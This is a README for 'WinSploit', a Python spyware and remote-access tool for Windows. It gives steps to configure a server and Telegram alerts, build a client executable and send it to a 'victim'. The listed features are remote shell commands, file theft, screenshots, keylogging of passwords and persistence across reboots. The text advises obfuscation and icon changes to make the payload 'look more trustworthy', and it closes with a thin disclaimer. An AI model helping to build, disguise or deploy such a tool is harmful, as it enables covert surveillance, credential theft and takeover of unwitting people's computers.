<center> <h1> WinSploit </h1> </center>
<img src="Home.png" alt="Server Screenshot">
WinSploit is a multithreaded windows spyware tool made in Python, allowing us to get complete control of windows based devices.

## Requirements:
- Python3 installed.

## Features:
- Execute any shell command and obtain its output.
- Download any file from the target system.
- Upload any file to the target system.
- Pop-up alert message on the target system with custom text.
- Take a screenshot of the target system in real-time.
- Capture keystrokes of the target system (whatever is typed in the target system like passwords, URLs, etc...)
- Make persistence on the target system (Auto-start after reboot/switch off-on)
- Handle multiple targets easily and switch between them.

## Usage:
1. Download as zip or run `git clone https://github.com/ethicalrishab/WinSploit.git`.
2. Go inside the WinSploit folder.
3. Run `pip install -r requirements.txt` to install external Python modules.
4. Open `server.py` in any code editor, set values of "ip" and "port" variable on which target's connection should be received.
5. Create a telegram bot and put its token in the "token" variable and put your telegram chat id in "chat_id" variable.
6. Save and close the server file.
7. Put the same IP and port in the `client.py` file, and save it.
8. Convert the `client.py` file to an exe file using `pyinstaller` or keep it in .py format as per your choice.
9. Run the server file on your system.
10. Send the `client.py` file to your target, upon execution, you will receive a notification on your telegram as well as the Server.

## Commands:
This section briefly describes the usage of each command available in our project.

<img src="help.png" alt="Help Section">

### Home Commands:
The commands within this section are designed for use within the main menu of the project, particularly when not actively engaging with a specific target.
- **help:** This command is utilized to showcase the tool's help section, aiding users in comprehending how to navigate and operate the tool effectively.
- **show targets:** By executing this command, users can view the roster of presently active targets within the system.
- **target <target_number>:** Use this command to establish a connection with a specific target, facilitating the execution of target-specific commands and enabling monitoring functionalities.
- **clear:** Employ this command to erase and refresh the output screen, ensuring a clear and uncluttered display.
- **exit:** This command provides a safe method for exiting the server. It is recommended to use this command instead of directly closing the tab, as proper server shutdown procedures should always be followed.

### Target Commands:
Commands in this category are applicable when engaging with a specific target.
- **background:** Temporarily shift the current interaction session away from the target and return to the main menu.
- **download <filename>:** Employ this command to retrieve any file from the target's system, transferring the specified file from the target's device to the law enforcement agent's system (e.g., download important.pdf).
- **upload <filename>:** Use this command to dispatch any file from the law enforcement agent's device to the target's system (e.g., upload hello.png).
- **clear:** Execute this command to erase content from the output screen, providing a clean and uncluttered display.
- **alert <text>:** Activate this command to showcase an alert popup on the victim's device.
- **screenshot <filename>:** Utilize this command to capture a screenshot of the victim's device and transmit it to the law enforcement agent's device.
- **keylogger start:** This command initiates a keylogging functionality, where the tool or script starts capturing and logging keystrokes made on the computer.
- **keylogger stop:** This command would likely stop the keylogging functionality, ceasing the capture and logging of keystrokes.
- **help:** This command is used to display a list of available commands or provide information about how to use the tool.
- **make persistence:** This command refers to making the tool or script persistent on the system, ensuring that it runs automatically every time the system starts.
- **remove persistence:** This command is associated with removing the persistence mechanism, stopping the tool or script from automatically running on system startup.
- **exit:** This command exits or closes the tool or script, terminating its execution.

## Note:
1. This tool will work correctly inside the same network. If you wish to use it outside your network, then you need to set up Port Forwarding either through your router or through utilities like (portmap.io and Openvpn) or Ngrok.
2. You can try various obfuscation methods or changing icons to make it look more trustworthy.
3. This is only made to use for monitoring your systems or for study and learning purposes. You will be totally responsible for any illegal act done through it by you.

## Customizations:
1. In `client.py`, you can set "auto_persistence=true" in order to make your payload become persistence as soon as the target executes it (without the need for the Server to send the command for becoming persistent).
2. In `server.py`, set "auto_keylogger=true" to automatically send a command for starting the keylogger as soon as a target is connected to it.
